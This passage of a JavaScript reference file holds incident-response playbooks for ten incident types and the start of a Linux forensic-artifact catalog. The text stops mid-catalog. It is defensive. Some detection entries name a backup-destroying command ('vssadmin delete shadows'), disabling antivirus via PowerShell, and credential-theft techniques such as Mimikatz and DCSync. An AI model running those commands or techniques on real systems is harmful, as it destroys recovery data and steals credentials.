"use strict";
// Incident Response & Forensics Reference
//
// Comprehensive playbooks, forensic artifact catalogs, memory analysis
// plugins, log source mappings, timeline tools, IOC taxonomies, and
// chain-of-custody procedures for digital forensics and incident response.

// ---------------------------------------------------------------------------
// 1. IR_PLAYBOOKS -- 10 incident-type playbooks
// ---------------------------------------------------------------------------

const IR_PLAYBOOKS = [
  // ---- Ransomware ----
  {
    incident: "ransomware",
    severity: "critical",
    detection: [
      "Unusual file rename activity (.encrypted, .locked, .crypt extensions)",
      "Mass file modification events in short time window",
      "Ransom note files appearing on endpoints (README.txt, DECRYPT_FILES.html)",
      "Endpoint Detection and Response (EDR) alert on known ransomware signatures",
      "Abnormal CPU/disk utilization from encryption processes",
      "Shadow copy deletion (vssadmin delete shadows)",
      "Network traffic to known ransomware C2 infrastructure",
      "Windows Event Log entries for service installations (Event ID 7045)",
      "Registry persistence keys modified (Run, RunOnce)",
      "Disabling of Windows Defender or other AV via PowerShell",
    ],
    containment: [
      "Immediately isolate affected systems from the network (do NOT power off)",
      "Block lateral movement by segmenting network VLANs",
      "Disable compromised accounts and reset credentials",
      "Block known C2 IP addresses and domains at perimeter firewall",
      "Preserve memory dumps of affected systems before any remediation",
      "Snapshot affected virtual machines if in virtualized environment",
      "Disable Remote Desktop Protocol (RDP) and SMB shares on unaffected hosts",
      "Implement emergency firewall rules to restrict east-west traffic",
      "Quarantine email accounts associated with initial phishing vector",
      "Engage law enforcement and outside incident response retainer",
    ],
    eradication: [
      "Identify and remove ransomware binary and all persistence mechanisms",
      "Scan all systems with updated signatures from multiple AV engines",
      "Remove malicious scheduled tasks, services, and registry entries",
      "Patch the vulnerability exploited for initial access (e.g., VPN, RDP)",
      "Verify no backdoors or secondary payloads remain (webshells, RATs)",
      "Rebuild compromised systems from known-good images",
      "Rotate all domain admin and service account passwords",
      "Update Group Policy to enforce AppLocker/WDAC policies",
      "Remove any unauthorized remote access tools (AnyDesk, TeamViewer)",
      "Validate Active Directory integrity (DCSync, Golden Ticket checks)",
    ],
    recovery: [
      "Restore data from offline/immutable backups after verifying integrity",
      "Prioritize restoration of critical business systems (ERP, email, DC)",
      "Rebuild domain controllers from clean media if AD was compromised",
      "Gradually reconnect restored systems to network with enhanced monitoring",
      "Verify backup restoration completeness against file inventories",
      "Re-enable services in phased approach (critical first, then secondary)",
      "Conduct post-restoration integrity checks on databases and applications",
      "Monitor restored systems for re-infection indicators for 72+ hours",
      "Communicate restoration status to business stakeholders",
      "Validate business processes function correctly on restored systems",
    ],
    lessonsLearned: [
      "Review backup strategy -- ensure 3-2-1 rule with offline/immutable copies",
      "Evaluate network segmentation effectiveness",
      "Assess endpoint protection and EDR coverage gaps",
      "Review privileged access management and credential hygiene",
      "Document initial access vector and recommend mitigations",
      "Update incident response plan based on response timeline gaps",
      "Conduct tabletop exercise based on this incident scenario",
      "Evaluate email filtering and user awareness training effectiveness",
      "Review patch management cadence for internet-facing systems",
      "Assess cyber insurance coverage and claims process",
    ],
    tools: [
      "Volatility (memory forensics)",
      "FTK Imager (disk imaging)",
      "KAPE (artifact collection)",
      "Velociraptor (endpoint collection)",
      "YARA (malware signature scanning)",
      "CyberChef (decoding/analysis)",
      "Process Monitor (runtime monitoring)",
      "Autoruns (persistence analysis)",
      "ID Ransomware (strain identification)",
      "NoMoreRansom.org (decryptor availability check)",
    ],
  },

  // ---- Phishing ----
  {
    incident: "phishing",
    severity: "high",
    detection: [
      "User report of suspicious email with link or attachment",
      "Email gateway alert on known phishing indicators (SPF/DKIM/DMARC fail)",
      "URL reputation service flagging embedded links as malicious",
      "Sandbox detonation of attachment revealing malicious behavior",
      "Credential harvesting page detected by web proxy or URL filter",
      "Multiple users reporting similar suspicious emails (campaign)",
      "Unusual OAuth application consent grants in cloud identity logs",
      "Login from anomalous geographic location following email receipt",
      "Email header analysis revealing spoofed sender domain",
      "Abnormal email forwarding rules created in user mailboxes",
    ],
    containment: [
      "Quarantine the phishing email from all mailboxes (admin purge)",
      "Block sender domain/IP at email gateway",
      "Block malicious URLs at web proxy and DNS sinkhole",
      "Reset credentials for any users who clicked links or submitted data",
      "Revoke OAuth tokens and active sessions for compromised accounts",
      "Enable MFA enforcement for affected accounts if not already active",
      "Block the phishing domain at firewall and DNS resolver level",
      "Search email logs for all recipients of the phishing campaign",
      "Disable compromised email forwarding rules",
      "Notify users who received the email but did not interact",
    ],
    eradication: [
      "Remove all instances of phishing email from mail system",
      "Scan endpoints of users who opened attachments with EDR/AV",
      "Remove any malware delivered via phishing attachment",
      "Revoke any persistent access tokens or API keys compromised",
      "Delete unauthorized email rules (forwarding, delegation)",
      "Remove attacker-created mailbox rules and delegates",
      "Update email filtering rules to catch this campaign's variants",
      "Block sender infrastructure (IP ranges, domains, certificates)",
      "Review and remove any unauthorized MFA devices registered",
      "Audit cloud application permissions for suspicious grants",
    ],
    recovery: [
      "Restore compromised accounts with new credentials and verified MFA",
      "Re-enable account access after security review",
      "Monitor accounts for 30 days for signs of residual compromise",
      "Update email security policies (DMARC enforcement, DKIM alignment)",
      "Deploy additional anti-phishing training for affected users",
      "Review and strengthen email authentication (SPF, DKIM, DMARC)",
      "Implement or update email warning banners for external senders",
      "Enable enhanced logging for mailbox access and rule changes",
      "Validate no data exfiltration occurred during compromise window",
      "Issue organization-wide phishing awareness communication",
    ],
    lessonsLearned: [
      "Evaluate email gateway effectiveness against this phishing type",
      "Review user awareness training program and phishing simulation results",
      "Assess MFA coverage and enforcement gaps",
      "Document phishing indicators for threat intelligence sharing",
      "Review OAuth application consent policies",
      "Evaluate URL filtering and sandboxing capabilities",
      "Assess incident reporting mechanism usability for end users",
      "Review email authentication configuration completeness",
      "Update phishing response playbook with new TTPs observed",
      "Consider deploying browser isolation for high-risk users",
    ],
    tools: [
      "PhishTool (email header analysis)",
      "URLScan.io (URL analysis)",
      "VirusTotal (attachment/URL scanning)",
      "Hybrid Analysis (sandbox detonation)",
      "Microsoft Message Trace (email tracking)",
      "Sublime Security (email detection)",
      "GoPhish (phishing simulation)",
      "WHOIS lookup (domain investigation)",
      "MXToolbox (email auth verification)",
      "CyberChef (payload decoding)",
    ],
  },

  // ---- Data Breach ----
  {
    incident: "data_breach",
    severity: "critical",
    detection: [
      "Data Loss Prevention (DLP) alert on sensitive data exfiltration",
      "Unusual large data transfers to external destinations",
      "Database query volume anomaly (bulk SELECT/export operations)",
      "Cloud storage bucket/blob access from unauthorized IP addresses",
      "Third-party notification of organization data on dark web or paste sites",
      "Anomalous API call patterns indicating data scraping",
      "Network flow analysis showing large outbound data volumes",
      "File integrity monitoring alert on sensitive data repositories",
      "Privileged user accessing data outside normal business scope",
      "Customer or partner report of unauthorized data exposure",
    ],
    containment: [
      "Identify scope of data exposed (PII, PHI, PCI, IP, credentials)",
      "Revoke access for compromised accounts and API keys immediately",
      "Block identified exfiltration channels (IP, domain, protocol)",
      "Isolate compromised database servers and application tiers",
      "Disable compromised service accounts and rotate secrets",
      "Preserve logs and evidence from all systems in exfiltration path",
      "Engage legal counsel for breach notification obligations",
      "Enable enhanced monitoring on remaining data repositories",
      "Restrict data access to minimum necessary personnel",
      "Contact law enforcement per organizational policy and regulations",
    ],
    eradication: [
      "Remove attacker access from all compromised systems",
      "Patch vulnerabilities used for initial access and privilege escalation",
      "Rotate all database credentials and connection strings",
      "Remove unauthorized data copies from any identified staging areas",
      "Rebuild compromised application servers from clean images",
      "Update access control lists and data classification policies",
      "Remove any exfiltration tools or tunnels (DNS tunneling, steganography)",
      "Audit and revoke excessive user and service account permissions",
      "Update WAF rules to block discovered attack patterns",
      "Verify no persistent access mechanisms remain (webshells, cron jobs)",
    ],
    recovery: [
      "Implement enhanced data access monitoring and alerting",
      "Deploy or update DLP controls for identified data types",
      "Issue breach notifications per regulatory requirements (GDPR, CCPA, HIPAA)",
      "Offer credit monitoring or identity protection to affected individuals",
      "Restore database integrity from verified clean backups if needed",
      "Re-enable services with enhanced access controls",
      "Conduct comprehensive access review across all data repositories",
      "Implement data tokenization or encryption for exposed data types",
      "Update data classification and handling procedures",
      "Engage third-party forensics firm for independent assessment",
    ],
    lessonsLearned: [
      "Review data classification and inventory completeness",
      "Assess DLP coverage gaps and policy effectiveness",
      "Evaluate database activity monitoring capabilities",
      "Review access control and least-privilege enforcement",
      "Document regulatory notification timeline and compliance",
      "Assess encryption-at-rest and in-transit coverage",
      "Review third-party data sharing agreements and controls",
      "Evaluate network segmentation around data repositories",
      "Update data breach response procedures and contact lists",
      "Assess insider threat program effectiveness",
    ],
    tools: [
      "Wireshark (network traffic analysis)",
      "NetworkMiner (network forensics)",
      "Splunk/ELK (log analysis and correlation)",
      "DLP solutions (Symantec, Digital Guardian, Microsoft Purview)",
      "Database Activity Monitoring (Imperva, IBM Guardium)",
      "SIEM (correlation and alerting)",
      "Have I Been Pwned (breach data checking)",
      "Dark web monitoring (Recorded Future, Flashpoint)",
      "CloudTrail/Azure Activity Log (cloud audit trails)",
      "Magnet AXIOM (endpoint/cloud forensics)",
    ],
  },

  // ---- Insider Threat ----
  {
    incident: "insider_threat",
    severity: "high",
    detection: [
      "User Behavior Analytics (UBA) alert on anomalous access patterns",
      "DLP alert on sensitive data access or transfer by authorized user",
      "After-hours access to sensitive systems outside normal work pattern",
      "Large volume of file downloads or copies to removable media",
      "Access to resources outside the user's job function or department",
      "Resignation or termination notice correlated with data access spike",
      "Unusual use of data staging or compression tools (WinRAR, 7zip)",
      "Cloud storage sync to personal accounts (Google Drive, Dropbox)",
      "Print volume anomaly for sensitive documents",
      "Manager or coworker report of suspicious behavior",
    ],
    containment: [
      "Coordinate with HR and legal before taking any visible action",
      "Increase monitoring on suspected insider's accounts silently",
      "Preserve all evidence in legally defensible manner",
      "Restrict access to most sensitive resources if risk is imminent",
      "Image the insider's workstation if immediate threat exists",
      "Review and preserve email, chat, and file access logs",
      "Disable remote access capabilities if employee is off-premises",
      "Engage digital forensics team for covert investigation",
      "Document chain of custody for all collected evidence",
      "Brief management on situation with legal counsel present",
    ],
    eradication: [
      "Disable all accounts upon formal separation or determination",
      "Revoke physical access (badges, keys, biometric enrollment)",
      "Recover all company assets (laptop, phone, tokens, documents)",
      "Remove insider's access from all cloud and SaaS applications",
      "Rotate any shared credentials the insider had access to",
      "Remove any unauthorized tools or software installed by insider",
      "Audit systems for backdoors or logic bombs planted by insider",
      "Review code repositories for malicious commits if developer",
      "Disable forwarding rules and delegates on insider's email",
      "Transfer ownership of shared resources and service accounts",
    ],
    recovery: [
      "Conduct comprehensive audit of all data accessed by insider",
      "Assess data exposure and determine notification requirements",
      "Redistribute the insider's legitimate access and responsibilities",
      "Update access controls based on identified policy gaps",
      "Implement enhanced monitoring for similar behavioral patterns",
      "Review and update insider threat indicators in UBA/SIEM",
      "Restore any data modified or deleted by the insider",
      "Update exit procedures to include enhanced data access review",
      "Communicate lessons learned to management (without identifying insider)",
      "Engage legal for potential civil or criminal proceedings",
    ],
    lessonsLearned: [
      "Review insider threat program maturity and detection capabilities",
      "Assess UBA tool effectiveness and tuning requirements",
      "Evaluate data access governance and least-privilege enforcement",
      "Review employee offboarding procedures and timeline",
      "Assess DLP controls for removable media and cloud storage",
      "Evaluate background check and continuous vetting processes",
      "Review employee monitoring policies and legal compliance",
      "Update insider threat awareness training for managers",
      "Assess separation of duties in critical business processes",
      "Review whistleblower and anonymous reporting mechanisms",
    ],
    tools: [
      "User Behavior Analytics (Exabeam, Securonix, Microsoft Sentinel)",
      "DLP (Digital Guardian, Forcepoint, Microsoft Purview)",
      "Endpoint monitoring (CrowdStrike, Carbon Black, SentinelOne)",
      "SIEM (Splunk, QRadar, LogRhythm)",
      "Email archiving (Mimecast, Proofpoint, Barracuda)",
      "USB/removable media controls (DeviceLock, Ivanti)",
      "Cloud Access Security Broker (Netskope, Zscaler, McAfee MVISION)",
      "Digital forensics (EnCase, FTK, Magnet AXIOM)",
      "Network forensics (Zeek, Moloch/Arkime)",
      "eDiscovery (Relativity, Nuix)",
    ],
  },

  // ---- DDoS ----
  {
    incident: "ddos",
    severity: "high",
    detection: [
      "Sudden spike in inbound network traffic volume",
      "Web application response time degradation or timeouts",
      "Network monitoring alerts on bandwidth saturation",
      "Increased connection count on load balancers and web servers",
      "SYN flood indicators: high half-open connection count",
      "DNS query volume anomaly (DNS amplification attack)",
      "Unusual traffic patterns: single protocol, uniform packet size",
      "CDN or WAF alerts on volumetric or application-layer attacks",
      "ISP notification of upstream traffic anomaly",
      "Multiple user/customer reports of service unavailability",
    ],
    containment: [
      "Activate DDoS mitigation service (Cloudflare, Akamai, AWS Shield)",
      "Enable rate limiting on web application firewalls",
      "Implement GeoIP blocking for traffic from non-business regions",
      "Configure upstream BGP blackholing for targeted IP ranges",
      "Scale infrastructure horizontally if cloud-based (auto-scaling)",
      "Enable SYN cookies on network devices to handle SYN floods",
      "Activate CDN caching to absorb HTTP flood traffic",
      "Contact ISP for upstream filtering of attack traffic",
      "Redirect DNS to scrubbing center if available",
      "Document attack characteristics for mitigation tuning",
    ],
    eradication: [
      "Analyze attack traffic to identify botnet C2 infrastructure",
      "Report attack source IPs to upstream providers and abuse contacts",
      "Block identified attack vectors at network perimeter",
      "Update WAF rules to filter application-layer attack patterns",
      "Configure RTBH (Remotely Triggered Black Hole) for persistent sources",
      "Update IPS signatures for identified DDoS patterns",
      "Report to law enforcement if attack is extortion-related",
      "Share IOCs with industry ISAC for coordinated response",
      "Review and update anti-DDoS architecture",
      "Implement challenge-response for suspicious traffic (CAPTCHA, JS challenge)",
    ],
    recovery: [
      "Gradually reduce mitigation controls and monitor for resurgence",
      "Verify all services are fully restored and performing normally",
      "Review and clear any connection backlogs on servers",
      "Flush CDN and DNS caches if records were modified during response",
      "Restore auto-scaling to normal parameters",
      "Communicate service restoration to customers and stakeholders",
      "Maintain heightened monitoring for 72 hours post-attack",
      "Review infrastructure costs incurred during attack response",
      "Document attack timeline and mitigation effectiveness",
      "Update DDoS response runbook with lessons from this incident",
    ],
    lessonsLearned: [
      "Evaluate DDoS mitigation service effectiveness and SLA",
      "Review infrastructure resilience and auto-scaling capabilities",
      "Assess DNS architecture for redundancy (Anycast, multiple providers)",
      "Review rate limiting and connection throttling configurations",
      "Evaluate ISP/transit provider DDoS protection agreements",
      "Assess application-layer DDoS resilience (Layer 7)",
      "Review communication procedures during extended outages",
      "Evaluate cost of attack vs. mitigation investment",
      "Document attack vectors for future detection tuning",
      "Conduct capacity planning based on attack volumes observed",
    ],
    tools: [
      "Cloudflare/Akamai/AWS Shield (DDoS mitigation)",
      "NetFlow/sFlow analyzers (traffic analysis)",
      "FastNetMon (DDoS detection)",
      "Wireshark (packet analysis)",
      "tcpdump (packet capture)",
      "nfdump/nfsen (NetFlow analysis)",
      "LOIC/HOIC analysis tools (attack tool identification)",
      "BGP looking glass (routing analysis)",
      "Grafana/Prometheus (infrastructure monitoring)",
      "PeeringDB (network interconnect information)",
    ],
  },

  // ---- Web Application Compromise ----
  {
    incident: "web_compromise",
    severity: "high",
    detection: [
      "WAF alert on SQL injection, XSS, or command injection attempts",
      "Web server log analysis showing exploitation patterns",
      "File integrity monitoring alert on web application files",
      "Webshell detection by endpoint security or manual review",
      "Defacement of web application pages",
      "Unexpected outbound connections from web server",
      "Database query anomalies indicating SQL injection exploitation",
      "New or modified files in web root directory",
      "Customer report of malicious redirect or content injection",
      "Search engine blacklisting or safe browsing warnings",
    ],
    containment: [
      "Isolate compromised web server from backend databases if possible",
      "Enable WAF in blocking mode with aggressive rule set",
      "Block attacker IP addresses at network perimeter",
      "Disable compromised web application features or endpoints",
      "Preserve web server logs, application logs, and memory",
      "Take filesystem snapshot for forensic analysis",
      "Revoke database credentials used by compromised application",
      "Remove or quarantine identified webshells immediately",
      "Enable enhanced logging on web server and application",
      "Notify development team to review application code",
    ],
    eradication: [
      "Remove all webshells, backdoors, and malicious code",
      "Patch exploited vulnerability in web application code",
      "Update web application framework and all dependencies",
      "Rebuild web server from known-good base image",
      "Rotate all application secrets, API keys, and database credentials",
      "Review and remediate identified vulnerabilities (OWASP Top 10)",
      "Remove any attacker-created user accounts in application",
      "Update WAF rules to block the specific attack vector used",
      "Scan codebase for additional vulnerabilities",
      "Review and harden web server configuration",
    ],
    recovery: [
      "Deploy patched application from clean build pipeline",
      "Restore database from clean backup if data was modified",
      "Verify application functionality after remediation",
      "Request removal from search engine blacklists",
      "Enable continuous vulnerability scanning on web application",
      "Implement Content Security Policy (CSP) headers",
      "Deploy runtime application self-protection (RASP) if available",
      "Monitor application logs for exploitation attempts",
      "Conduct penetration test to validate remediation",
      "Communicate status to affected users if data was exposed",
    ],
    lessonsLearned: [
      "Review secure software development lifecycle (SSDLC) practices",
      "Assess web application vulnerability scanning frequency",
      "Evaluate WAF rule coverage and tuning effectiveness",
      "Review input validation and output encoding practices",
      "Assess dependency management and vulnerability patching",
      "Evaluate web server hardening and configuration management",
      "Review application authentication and session management",
      "Assess logging and monitoring coverage for web applications",
      "Evaluate penetration testing program scope and frequency",
      "Review CI/CD pipeline security controls",
    ],
    tools: [
      "Burp Suite (web application testing)",
      "OWASP ZAP (vulnerability scanning)",
      "ModSecurity / OWASP CRS (WAF)",
      "Nikto (web server scanner)",
      "SQLMap (SQL injection testing)",
      "WPScan (WordPress vulnerability scanner)",
      "Retire.js / npm audit (dependency scanning)",
      "Semgrep / SonarQube (static analysis)",
      "Web Log Analyzer (log parsing)",
      "Google Safe Browsing API (blacklist checking)",
    ],
  },

  // ---- Supply Chain Attack ----
  {
    incident: "supply_chain",
    severity: "critical",
    detection: [
      "Software composition analysis alert on compromised dependency",
      "Hash mismatch on downloaded software package or update",
      "Vendor notification of compromise to their build system",
      "Behavioral anomaly in recently updated third-party software",
      "Community/CERT advisory on compromised package (e.g., npm, PyPI)",
      "Code signing certificate anomaly on vendor software",
      "Unexpected network connections from recently updated software",
      "Build pipeline integrity check failure (reproducible builds)",
      "Unusual behavior post-update that deviates from changelog",
      "Threat intelligence feed indicating vendor compromise",
    ],
    containment: [
      "Immediately halt deployment of compromised software/update",
      "Isolate systems running compromised version of software",
      "Block network communication from compromised software",
      "Roll back to last known-good version of affected software",
      "Revoke any credentials that compromised software had access to",
      "Audit all systems for presence of compromised package version",
      "Contact the compromised vendor for joint response coordination",
      "Disable automatic updates temporarily until threat is assessed",
      "Scan all build artifacts for tampering or injection",
      "Alert downstream customers if you are part of the supply chain",
    ],
    eradication: [
      "Remove compromised software version from all systems",
      "Scan all systems for secondary payloads deployed by the package",
      "Remove any persistence mechanisms established by the payload",
      "Audit build pipelines for unauthorized modifications",
      "Replace compromised dependencies with verified alternatives",
      "Re-sign and re-deploy software with verified clean build",
      "Rotate all secrets accessible to the compromised software",
      "Review source control for unauthorized commits",
      "Update package pinning and lock files with known-good hashes",
      "Implement or update software bill of materials (SBOM)",
    ],
    recovery: [
      "Deploy verified clean version of affected software",
      "Re-enable services with enhanced monitoring",
      "Validate build pipeline integrity end-to-end",
      "Implement dependency pinning with hash verification",
      "Enable continuous monitoring of software supply chain",
      "Establish vendor security assessment cadence",
      "Conduct comprehensive vulnerability assessment post-recovery",
      "Update procurement and vendor management procedures",
      "Communicate impact assessment to stakeholders and regulators",
      "Evaluate alternative vendors or components if trust is lost",
    ],
    lessonsLearned: [
      "Review software supply chain security posture",
      "Assess dependency management and pinning practices",
      "Evaluate build pipeline security (signing, SBOM, provenance)",
      "Review vendor security assessment and due diligence process",
      "Assess software composition analysis tool coverage",
      "Evaluate ability to detect and respond to supply chain threats",
      "Review code signing and verification practices",
      "Assess open source software governance policies",
      "Evaluate container image scanning and registry security",
      "Review SLSA (Supply-chain Levels for Software Artifacts) compliance",
    ],
    tools: [
      "Snyk / Dependabot (dependency vulnerability scanning)",
      "OWASP Dependency-Check (SCA)",
      "Sigstore/Cosign (artifact signing and verification)",
      "SLSA framework tools (supply chain integrity)",
      "npm audit / pip audit / cargo audit (package auditing)",
      "Syft / Grype (SBOM generation and scanning)",
      "in-toto (supply chain verification)",
      "Socket.dev (npm/PyPI malicious package detection)",
      "Reproducible builds tools",
      "HashiCorp Vault (secrets management)",
    ],
  },

  // ---- Account Compromise ----
  {
    incident: "account_compromise",
    severity: "high",
    detection: [
      "Impossible travel alert: login from geographically distant locations",
      "Brute force or password spraying detection on authentication logs",
      "MFA bypass or registration of unauthorized MFA device",
      "Login from known malicious IP address or anonymizing proxy/VPN",
      "Credential found in public breach database or paste site",
      "Unusual account activity: privilege escalation, group membership change",
      "Service account used interactively or from unexpected source",
      "Failed login spikes followed by successful authentication",
      "User report of unauthorized account activity or lockout",
      "OAuth consent grant for suspicious or unknown application",
    ],
    containment: [
      "Force password reset on compromised account immediately",
      "Revoke all active sessions and refresh tokens",
      "Disable account temporarily if active exploitation continues",
      "Block attacker source IP addresses at authentication gateway",
      "Remove unauthorized MFA devices and re-enroll legitimate ones",
      "Revoke OAuth tokens and application consents",
      "Review and remove unauthorized mailbox rules and delegates",
      "Restrict conditional access policies to trusted locations/devices",
      "Preserve authentication and activity logs for investigation",
      "Notify account owner through out-of-band communication channel",
    ],
    eradication: [
      "Remove all unauthorized access granted through compromised account",
      "Revoke any API keys or service credentials created by attacker",
      "Remove attacker-created user accounts and role assignments",
      "Clean up any data modifications made by attacker",
      "Remove unauthorized applications and service principals",
      "Audit all resources accessible by compromised account",
      "Remove any persistence in cloud infrastructure (Lambda, Azure Functions)",
      "Review and remediate the initial compromise vector",
      "Update password policy to prevent reuse of compromised password",
      "Scan for credential stuffing across other accounts with same password",
    ],
    recovery: [
      "Re-enable account with new strong password and verified MFA",
      "Restore any data or configurations modified by attacker",
      "Implement conditional access policies (trusted IPs, compliant devices)",
      "Enable enhanced authentication logging and anomaly detection",
      "Monitor account for 30 days for signs of re-compromise",
      "Review and update access rights per least-privilege principle",
      "Enable sign-in risk policies in identity protection",
      "Deploy privileged access workstations for admin accounts",
      "Implement password manager and unique password requirements",
      "Communicate incident to relevant stakeholders",
    ],
    lessonsLearned: [
      "Review MFA enforcement and coverage across all accounts",
      "Assess password policy strength and enforcement",
      "Evaluate identity threat detection and response capabilities",
      "Review conditional access policy comprehensiveness",
      "Assess privileged account management practices",
      "Evaluate credential monitoring for leaked credentials",
      "Review service account governance and rotation policies",
      "Assess single sign-on and federation security configuration",
      "Evaluate self-service password reset security controls",
      "Review account lockout and brute force protection settings",
    ],
    tools: [
      "Azure AD Identity Protection (risk-based authentication)",
      "CrowdStrike Falcon Identity (identity threat detection)",
      "Have I Been Pwned API (credential breach monitoring)",
      "Okta/Duo/PingIdentity (MFA and IAM)",
      "BloodHound (Active Directory attack path analysis)",
      "PingCastle (AD security assessment)",
      "Lithnet Password Protection (AD password filter)",
      "Microsoft Authenticator / FIDO2 keys (phishing-resistant MFA)",
      "SprayingToolkit detection (password spray detection)",
      "Azure AD Sign-in Logs / AWS CloudTrail (authentication audit)",
    ],
  },

  // ---- Malware Infection ----
  {
    incident: "malware",
    severity: "high",
    detection: [
      "Endpoint protection alert on malicious file or behavior",
      "EDR detection of suspicious process execution chain",
      "Network IDS/IPS signature match for known malware communication",
      "DNS query to known malware C2 domain or DGA-generated domain",
      "Anomalous outbound traffic patterns (beaconing behavior)",
      "Registry modification associated with known malware persistence",
      "Scheduled task or service installation by non-admin process",
      "File integrity monitoring alert on system files",
      "Memory-only indicators: reflective DLL injection, process hollowing",
      "Sandbox alert from email attachment or download detonation",
    ],
    containment: [
      "Isolate infected endpoint from network (maintain power for forensics)",
      "Block malware C2 infrastructure at network perimeter",
      "Capture memory dump of infected system before any remediation",
      "Disable autorun/autoplay to prevent USB-based propagation",
      "Block lateral movement protocols (SMB, WMI, PsExec, WinRM)",
      "Quarantine malware samples for analysis in secure sandbox",
      "Revoke credentials cached on infected system",
      "Update network-based detection signatures",
      "Search for indicators of compromise across all endpoints",
      "Isolate file shares accessible from infected system",
    ],
    eradication: [
      "Remove malware binary and all identified variants",
      "Clean all persistence mechanisms (registry, scheduled tasks, services)",
      "Remove injected code from legitimate processes if possible",
      "Verify removal with full system scan using updated definitions",
      "Rebuild system from known-good image if rootkit is suspected",
      "Update antivirus/EDR signatures with IOCs from this infection",
      "Patch vulnerability exploited for initial malware delivery",
      "Remove any tools downloaded by the malware (Mimikatz, PsExec)",
      "Verify boot sector and MBR integrity",
      "Clean or rebuild network shares used for propagation",
    ],
    recovery: [
      "Restore system from clean backup or rebuild from image",
      "Reconnect to network with enhanced monitoring",
      "Verify system functionality and business application operation",
      "Update endpoint protection policy based on evasion techniques",
      "Deploy IOCs to all security tools (EDR, SIEM, proxy, firewall)",
      "Conduct sweep of all endpoints for remaining infections",
      "Monitor network for C2 traffic from other potentially infected hosts",
      "Update user awareness training to cover this delivery method",
      "Submit malware samples to AV vendors for signature creation",
      "Validate data integrity on restored systems",
    ],
    lessonsLearned: [
      "Review endpoint protection coverage and configuration",
      "Assess EDR detection and response capabilities",
      "Evaluate network segmentation effectiveness",
      "Review application whitelisting / execution control policies",
      "Assess email and web filtering effectiveness",
      "Evaluate patch management timeliness",
      "Review user privilege levels and admin access",
      "Assess malware analysis and reverse engineering capabilities",
      "Evaluate threat intelligence integration and utilization",
      "Review incident detection and response timeline",
    ],
    tools: [
      "IDA Pro / Ghidra (malware reverse engineering)",
      "ANY.RUN / Joe Sandbox / Cuckoo (dynamic analysis)",
      "YARA (signature-based detection)",
      "PE-sieve / Hollows Hunter (process scanning)",
      "ProcDOT (malware behavior visualization)",
      "Detect It Easy (binary analysis)",
      "dnSpy / ILSpy (.NET decompilation)",
      "Process Hacker (runtime process analysis)",
      "Remnux (malware analysis distribution)",
      "FLOSS (string extraction from obfuscated binaries)",
    ],
  },

  // ---- Advanced Persistent Threat (APT) ----
  {
    incident: "apt",
    severity: "critical",
    detection: [
      "Threat intelligence match on nation-state or APT group indicators",
      "Living-off-the-land technique detection (PowerShell, WMI, certutil)",
      "Long-term beaconing pattern identified in network traffic analysis",
      "Lateral movement detection across multiple systems over extended period",
      "Custom malware or zero-day exploit identified by security researchers",
      "DNS tunneling or covert channel communication detected",
      "Credential theft tool usage (Mimikatz, Kerberoasting, DCSync)",
      "Anomalous administrative activity across domain controllers",
      "Strategic web compromise (watering hole) targeting organization",
      "Intelligence community or government notification of targeting",
    ],
    containment: [
      "Engage specialized incident response firm with APT experience",
      "Do NOT alert the adversary -- maintain operational security",
      "Implement enhanced monitoring before taking containment actions",
      "Map full extent of compromise before beginning containment",
      "Prepare simultaneous containment actions across all compromised systems",
      "Establish out-of-band communication channel for IR team",
      "Segment critical assets and crown jewels immediately",
      "Deploy additional EDR sensors on high-value targets",
      "Enable full packet capture on critical network segments",
      "Brief executive leadership and legal counsel (need-to-know basis)",
    ],
    eradication: [
      "Execute coordinated eradication across all compromised systems simultaneously",
      "Rebuild Active Directory from scratch if domain admin was compromised",
      "Reset KRBTGT password twice (with replication interval between resets)",
      "Replace all Golden Ticket-capable credentials",
      "Rebuild all compromised systems from known-good media",
      "Remove all persistence (firmware, MBR, WMI subscriptions, scheduled tasks)",
      "Rotate all certificates and PKI infrastructure if CA was compromised",
      "Update all security tools with comprehensive IOC list",
      "Deploy kernel-level monitoring on critical systems",
      "Validate firmware integrity on network devices and servers",
    ],
    recovery: [
      "Implement zero-trust architecture for recovered environment",
      "Deploy enhanced detection for known APT group TTPs",
      "Establish continuous threat hunting program",
      "Implement privileged access management (PAM) solution",
      "Deploy network detection and response (NDR) capability",
      "Enable comprehensive logging with extended retention (1+ year)",
      "Conduct red team assessment to validate security improvements",
      "Establish relationship with threat intelligence partners",
      "Implement managed detection and response (MDR) if not present",
      "Monitor for adversary return for minimum 12 months",
    ],
    lessonsLearned: [
      "Conduct comprehensive security architecture review",
      "Assess threat hunting program maturity and staffing",
      "Evaluate SIEM detection coverage against MITRE ATT&CK framework",
      "Review network visibility and segmentation architecture",
      "Assess privileged access management and monitoring",
      "Evaluate endpoint detection capability against fileless techniques",
      "Review threat intelligence program and sharing relationships",
      "Assess incident response team capability and training needs",
      "Evaluate supply chain security in context of APT targeting",
      "Review physical security and social engineering controls",
    ],
    tools: [
      "MITRE ATT&CK Navigator (TTP mapping)",
      "Velociraptor (scalable endpoint forensics)",
      "Zeek/Bro (network security monitoring)",
      "RITA (Real Intelligence Threat Analytics -- beaconing detection)",
      "Bloodhound / SharpHound (AD attack path mapping)",
      "Sysmon (enhanced Windows event logging)",
      "OSQuery (cross-platform endpoint visibility)",
      "Elastic Security / Splunk ES (SIEM/threat detection)",
      "Mandiant / CrowdStrike IR (specialized APT response)",
      "Threat Intelligence Platforms (MISP, OpenCTI, ThreatConnect)",
    ],
  },
];

// ---------------------------------------------------------------------------
// 2. FORENSIC_ARTIFACTS
// ---------------------------------------------------------------------------

const FORENSIC_ARTIFACTS = {
  linux: [
    { name: "bash_history", location: "~/.bash_history", description: "Command history for bash shell sessions", tool: "cat / strings", significance: "Reveals commands executed by user including reconnaissance, data access, and exfiltration" },
    { name: "zsh_history", location: "~/.zsh_history", description: "Command history for zsh shell sessions", tool: "cat / strings", significance: "Alternative shell history; same forensic value as bash_history" },
    { name: "auth_log", location: "/var/log/auth.log", description: "Authentication events including SSH, sudo, and PAM", tool: "grep / journalctl", significance: "Login attempts, privilege escalation, remote access patterns" },
    { name: "secure_log", location: "/var/log/secure", description: "Authentication log on RHEL/CentOS systems", tool: "grep / journalctl", significance: "Same as auth.log for Red Hat-based distributions" },
    { name: "syslog", location: "/var/log/syslog", description: "General system messages and events", tool: "grep / journalctl", significance: "System-wide events, service starts/stops, kernel messages" },
    { name: "kern_log", location: "/var/log/kern.log", description: "Kernel-level messages", tool: "dmesg / grep", significance: "Hardware events, kernel module loading, USB device connections" },
